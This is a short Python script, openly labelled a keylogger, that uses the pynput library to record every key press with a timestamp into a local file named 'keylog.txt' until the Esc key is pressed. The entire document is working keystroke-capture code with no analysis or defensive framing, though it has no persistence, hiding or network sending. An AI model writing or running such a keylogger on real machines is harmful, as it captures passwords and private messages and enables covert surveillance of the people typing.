#!/usr/bin/env python3

#Import Necessary Libraries
from pynput import keyboard
import logging

#Set Directory of Log File
log = ""

#Configure The Format of Log File
logging.basicConfig(filename=(log + "keylog.txt"),level = logging.DEBUG,format='%(asctime)s: %(message)s')

#Function For Logging Key Press
def on_press(key):
    logging.info(str(key))

#Function For Logging Key Release (Keylogger Can Be Terminated Using 'esc' key)
def on_release(key):
    if str(key) == 'Key.esc':
        print('Terminated')
        return False

#Configure The Listener
with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
    
